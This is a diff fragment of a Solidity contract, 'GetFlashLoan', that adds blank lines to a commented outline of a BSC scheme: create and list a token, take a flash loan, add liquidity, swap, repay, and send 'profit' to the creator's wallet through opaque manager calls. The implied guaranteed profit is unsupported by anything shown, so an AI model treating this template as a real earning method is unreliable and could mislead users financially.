@@ -40,25 +40,32 @@ contract GetFlashLoan {
       
       /* Breakdown of functions
       // Submit token to BSC blockchain
+      
       string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
    
       // List the token on PancakeSwap
+      
       manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
       
       // Get BNB Loan from Multiplier-Finance
+      
       string memory loanAddress = manager.takeFlashLoan(loanAmount);
         
       // Send Borrowed BNB to provide liquidity of newly created Token
+      
       string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
       manager.pancakeAddLiquidity(bnbPair, loanAmount);
      
       // Perform swaps between Token and BNB and back again
+      
       manager.pancakePerformSwaps();
       
       // Repay Flashloan with Multiplier-Finance
+      
       manager.repayLoan(loanAddress);
       
       // Move remaining BNB profit from Contract to the contract creators wallet
+      
       manager.contractToWallet("BNB");
    
  
